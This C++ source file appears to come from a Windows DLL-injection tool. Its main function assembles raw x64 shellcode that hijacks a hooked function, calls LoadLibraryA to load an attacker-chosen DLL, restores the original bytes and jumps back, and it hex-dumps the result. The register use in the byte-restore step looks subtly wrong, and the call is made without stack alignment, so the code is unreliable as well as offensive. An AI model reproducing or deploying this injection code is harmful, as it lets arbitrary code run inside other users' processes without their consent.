#include "shell.h"

inline void DumpHex(const BYTE* data, size_t length, const char* title) {
    printf("%s (%zu bytes):\n", title, length);
    for (size_t i = 0; i < length; ++i) {
        // print a newline every 16 bytes
        if (i % 16 == 0) {
            printf("  %04zx: ", i);
        }
        printf("%02X ", data[i]);
        if ((i % 16) == 15 || i == length - 1) {
            printf("\n");
        }
    }
}

// Generate x64 shellcode: LoadLibraryA(dllPath), restore original bytes, jump back
std::vector<BYTE> GenerateShellcode(PVOID hookAddr, PVOID dllPathAddr, PVOID shellcodeAddr, const BYTE* origBytes, size_t hookSize, bool validOrigBytes) {
    printf("Generating shellcode...\n");
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) {
        hKernel32 = LoadLibraryA("kernel32.dll");
        if (!hKernel32) {
            printf("GetModuleHandleA/LoadLibraryA for kernel32.dll failed: %lu\n", GetLastError());
            return {};
        }
    }
    FARPROC loadLibAddr = GetProcAddress(hKernel32, "LoadLibraryA");
    if (!loadLibAddr) {
        printf("GetProcAddress for LoadLibraryA failed: %lu\n", GetLastError());
        return {};
    }

    // Shellcode: save regs, call LoadLibraryA, restore original bytes (if valid), jump back
    std::vector<BYTE> shellcode;
    // Push registers
    shellcode.insert(shellcode.end(), {
        0x50, 0x51, 0x52, 0x53, 0x55, 0x56, 0x57, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57
        });

    // mov rcx, dllPathAddr
    shellcode.insert(shellcode.end(), { 0x48, 0xB9 });
    shellcode.insert(shellcode.end(), (BYTE*)&dllPathAddr, (BYTE*)&dllPathAddr + sizeof(PVOID));

    // call LoadLibraryA
    shellcode.insert(shellcode.end(), { 0x48, 0xB8 });
    shellcode.insert(shellcode.end(), (BYTE*)&loadLibAddr, (BYTE*)&loadLibAddr + sizeof(PVOID));
    shellcode.insert(shellcode.end(), { 0xFF, 0xD0 });

    // Restore original bytes (only if valid)
    if (validOrigBytes) {
        // mov rcx, hookAddr
        shellcode.insert(shellcode.end(), { 0x48, 0xB9 });
        shellcode.insert(shellcode.end(), (BYTE*)&hookAddr, (BYTE*)&hookAddr + sizeof(PVOID));

        // mov rsi, origBytesAddr
        shellcode.insert(shellcode.end(), { 0x48, 0xBE });
        PVOID origBytesAddr = (PVOID)((BYTE*)shellcodeAddr + shellcode.size() + 10 + hookSize);
        shellcode.insert(shellcode.end(), (BYTE*)&origBytesAddr, (BYTE*)&origBytesAddr + sizeof(PVOID));

        // mov r8, hookSize
        shellcode.insert(shellcode.end(), { 0x4C, 0xB8 });
        shellcode.insert(shellcode.end(), (BYTE*)&hookSize, (BYTE*)&hookSize + sizeof(size_t));

        // memcpy loop (rep movsb)
        shellcode.insert(shellcode.end(), { 0xF3, 0xA4 });
    }

    // Pop registers
    shellcode.insert(shellcode.end(), {
        0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5F, 0x5E, 0x5D, 0x5B, 0x5A, 0x59, 0x58
        });

    // jmp hookAddr + hookSize
    PVOID returnAddr = (PBYTE)hookAddr + hookSize;
    shellcode.insert(shellcode.end(), { 0x48, 0xB8 });
    shellcode.insert(shellcode.end(), (BYTE*)&returnAddr, (BYTE*)&returnAddr + sizeof(PVOID));
    shellcode.insert(shellcode.end(), { 0xFF, 0xE0 });

    // Append origBytes (only if valid)
    if (validOrigBytes) {
        shellcode.insert(shellcode.end(), origBytes, origBytes + hookSize);
    }

    printf("Shellcode size: %zu bytes\n", shellcode.size());
    DumpHex(shellcode.data(), shellcode.size(), "Shellcode hex dump");
    return shellcode;
}